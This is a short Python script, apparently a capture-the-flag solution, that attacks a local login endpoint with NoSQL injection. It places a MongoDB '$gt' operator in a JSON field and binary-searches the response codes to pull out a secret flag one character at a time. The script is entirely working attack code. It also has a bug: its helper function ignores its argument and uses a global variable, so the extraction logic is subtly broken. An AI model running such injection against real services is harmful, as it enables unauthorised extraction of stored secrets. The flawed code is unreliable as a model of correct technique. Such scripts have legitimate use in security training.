import requests
import uuid
import string

url = "http://localhost:28001/login"



flag = ""


def to_uni(num):
    next_uni = "\\u" + hex(mid)[2:].zfill(5)
    return next_uni

while not flag.endswith("}"):
    lb = 1
    rb = 9999
    while lb + 1 < rb:
        mid = (lb + rb) // 2
        payload = {
            "history_id": {
                "username": "admin",
                "generated_payload": {"$gt": f"{flag}{to_uni(mid)}"},
            }
        }
        r = requests.post(url, json=payload)
        if r.status_code == 200:
            lb = mid
        else:
            rb = mid
    flag += to_uni(lb) 

    print(flag)

print(flag)
